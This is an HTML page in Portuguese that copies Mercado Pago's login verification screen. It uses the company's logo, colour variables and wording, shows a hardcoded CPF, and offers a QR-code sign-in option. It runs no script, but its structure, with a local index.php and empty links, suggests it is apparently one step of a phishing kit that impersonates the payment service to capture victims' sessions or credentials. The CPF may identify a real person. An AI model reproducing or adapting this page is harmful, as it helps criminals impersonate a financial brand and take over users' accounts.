<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Escolha um método de verificação</title>
    <style>
        /* Variáveis de Cor Globais */
        :root {
            --andes-color-yellow-500: #ffe600;
            --andes-color-blue-100: rgba(52, 131, 250, 0.1);
            --andes-color-blue-500: #3483fa;
            --andes-text-color-primary: #333;
            --andes-text-color-secondary: #555;
            --andes-text-color-link: var(--andes-color-blue-500);
            --andes-background-color-primary: #fff;
            --andes-background-color-secondary: #f5f5f5;
            --andes-border-color-secondary: #ededed;
        }

        /* Reset básico e estilos do Body */
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            background-color: var(--andes-background-color-secondary); 
        }

        /* Estilo do cabeçalho principal */
        .main-header {
            background-color: var(--andes-color-yellow-500);
            padding: 0 48px;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: flex-start;
        }
        .main-header img { height: 37px; vertical-align: middle; }

        /* Container principal do conteúdo */
        .main-content {
            padding: 80px 24px; 
            flex-grow: 1;
        }
        
        .content-wrapper {
            max-width: 960px;
            margin: 0 auto;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            gap: 64px;
        }
        
        /* Coluna da Esquerda */
        .left-column {
            display: flex;
            flex-direction: column;
            width: 320px;
            flex-shrink: 0;
        }
        .session-start-label { font-size: 12px; font-weight: 600; color: var(--andes-text-color-secondary); text-transform: uppercase; margin-bottom: 8px; }
        .main-title { font-size: 28px; font-weight: 400; color: var(--andes-text-color-primary); line-height: 1.25; margin: 0; }
        .user-identifier-box { display: flex; align-items: center; gap: 16px; border: 1px solid rgba(0, 0, 0, .1); border-radius: 1.5625rem; padding: 8px 12px; margin-top: 32px; width: fit-content; }
        .icon-wrapper { width: 32px; height: 32px; border-radius: 50%; background-color: var(--andes-color-blue-100); display: flex; align-items: center; justify-content: center; }
        .user-identifier-box .icon-wrapper svg { color: var(--andes-color-blue-500); }
        .identifier-text-block { display: flex; flex-direction: column; }
        .identifier-text-block .cpf-text { font-size: 14px; font-weight: 400; color: var(--andes-text-color-primary); }
        .identifier-text-block .change-account-link { font-size: 13px; color: var(--andes-text-color-link); text-decoration: none; margin-top: 2px; }
        .identifier-text-block .change-account-link:hover { text-decoration: underline; }
        .help-link { display: block; margin-top: 24px; color: var(--andes-text-color-link); text-decoration: none; font-size: 14px; font-weight: 500; }
        .help-link:hover { text-decoration: underline; }

        /* Coluna da Direita (Card de Verificação) */
        .verification-card {
            width: 100%;
            max-width: 480px;
            background-color: var(--andes-background-color-primary);
            box-shadow: 0 1px 4px 0 rgba(0,0,0,.1);
            border-radius: 6px;
            padding: 8px 0;
            box-sizing: border-box;
        }

        .verification-option {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 16px 24px;
            text-decoration: none;
            color: inherit;
            transition: background-color 0.2s;
        }
        .verification-option:hover { background-color: var(--andes-background-color-secondary); }

        .verification-option .icon-container {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: var(--andes-color-blue-100);
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }
        
        .verification-option .icon-container svg {
            color: var(--andes-color-blue-500);
        }
        
        .verification-option .text-content { flex-grow: 1; }
        .verification-option .text-content h3 { margin: 0 0 4px 0; font-size: 16px; font-weight: 500; color: var(--andes-text-color-primary); }
        .verification-option .text-content p { margin: 0; font-size: 14px; color: var(--andes-text-color-secondary); }
        .verification-option .chevron-icon { margin-left: auto; }
        .verification-option .chevron-icon polyline { stroke: var(--andes-color-blue-500); }
        
        .final-separator {
            height: 1px;
            background-color: var(--andes-border-color-secondary);
            margin: 8px 24px;
        }

        .cant-login-link {
            display: block;
            text-align: left; 
            color: var(--andes-text-color-link);
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
            padding: 16px 24px 24px 24px;
        }
        .cant-login-link:hover { text-decoration: underline; }

    </style>
</head>
<body>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <div class="content-wrapper">
            <div class="left-column">
                <span class="session-start-label">INÍCIO DE SESSÃO</span>
                <h1 class="main-title">Escolha um método de verificação para iniciar sessão</h1>
                <div class="user-identifier-box">
                    <div class="icon-wrapper">
                        <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.999 15.75C15.7275 15.75 18.75 12.7275 18.75 8.999C18.75 5.27053 15.7275 2.248 11.999 2.248C8.27053 2.248 5.248 5.27053 5.248 8.999C5.248 12.7275 8.27053 15.75 11.999 15.75ZM11.999 14.25C9.09895 14.25 6.748 11.899 6.748 8.999C6.748 6.09895 9.09895 3.748 11.999 3.748C14.899 3.748 17.25 6.09895 17.25 8.999C17.25 11.899 14.899 14.25 11.999 14.25Z"></path><path d="M5.98045 18.75C4.74861 18.75 3.75 19.7486 3.75 20.9804V21.7304H2.25V20.9804C2.25 18.9202 3.92018 17.25 5.98045 17.25H18C20.0711 17.25 21.75 18.9289 21.75 21V21.75H20.25V21C20.25 19.7574 19.2426 18.75 18 18.75H5.98045Z"></path></svg>
                    </div>
                    <div class="identifier-text-block">
                        <span class="cpf-text">CPF: 288.114.198-67</span>
                        <a href="/index.php" class="change-account-link">Trocar conta</a>
                    </div>
                </div>
                <a href="#" class="help-link">Preciso de ajuda</a>
            </div>

            <div class="verification-card">
                
                <a href="#" class="verification-option">
                    <div class="icon-container"><svg class="channel-icon__shape--filled" width="20" height="20" viewBox="0 0 20 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path d="M11.6871 0H8.32307V6.66142H9.98973V4.97848H11.6667V3.31313H9.98973V1.66536H11.6871V0Z"></path><path d="M11.6564 13.2617V14.9271H9.98973V16.6673H8.32307V11.6712H9.98973V13.2617H11.6564Z"></path><path d="M18.3333 18.3238H20V19.9892H18.3333V18.3238Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M10.0204 10.0097V11.6495H11.6769V13.3384H13.3026V18.3258H18.3026V16.6322H20V14.9668H18.3026V13.3298H13.3435V10.0077H11.6871V6.67894H10.0204V8.34431H6.64621V9.98419H4.95381V8.32483H1.62048V9.93896H0V11.6043H1.66667V9.99018H3.32836V11.6495H6.66169V10.0097H10.0204ZM14.9693 14.9951H16.6359V16.6605H14.9693V14.9951Z"></path><path d="M18.3795 9.99018H16.6769V11.6645H15.0102V9.99018H13.3795V8.32483H18.3795V9.99018Z"></path><path d="M18.3333 10.0077H20V13.3384H18.3333V10.0077Z"></path><path d="M10.0204 16.6693H11.6871V18.3346H13.3538V20H8.35384V18.3346H10.0204V16.6693Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0 0V6.67897H6.62046V0H0ZM4.9538 1.66536H1.66667V5.01361H4.9538V1.66536Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0 13.321H6.62046V20H0V13.321ZM1.66667 14.9864H4.9538V18.3346H1.66667V14.9864Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M13.3591 0.00321877V6.68219H19.9795V0.00321877H13.3591ZM18.3129 1.66857H15.0257V5.01683H18.3129V1.66857Z"></path></svg></div>
                    <div class="text-content"><h3>Código QR</h3><p>Você vai escanear o código com a câmera do seu celular ou pelo app do Mercado Pago.</p></div>
                    <div class="chevron-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
                </a>

                <a href="#" class="final-separator"></a> <a href="#" class="cant-login-link">Não consigo iniciar sessão</a>
            </div>
        </div>
    </main>

</body>
</html>